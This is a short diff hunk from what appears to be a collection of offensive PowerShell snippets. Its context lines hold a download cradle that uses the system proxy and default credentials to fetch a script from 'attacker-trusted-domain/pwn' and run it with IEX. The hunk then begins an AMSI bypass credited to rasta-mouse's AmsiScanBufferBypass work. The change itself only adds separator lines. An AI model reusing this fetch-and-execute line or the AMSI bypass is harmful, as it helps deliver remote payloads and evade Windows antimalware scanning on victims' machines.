@@ -7,7 +7,9 @@ $e.proxy=[Net.WebRequest]::GetSystemWebProxy();
 $e.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
 IEX $e.downloadstring('http://attacker-trusted-domain/pwn');
 
+######################################################################################################################################
 [**] update 08/01/2019 from rasta-mouse's AmsiScanBufferBypass project (https://rastamouse.me/2018/12/amsiscanbuffer-bypass-part-4/):
+######################################################################################################################################
 
 $Ref = (
 "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
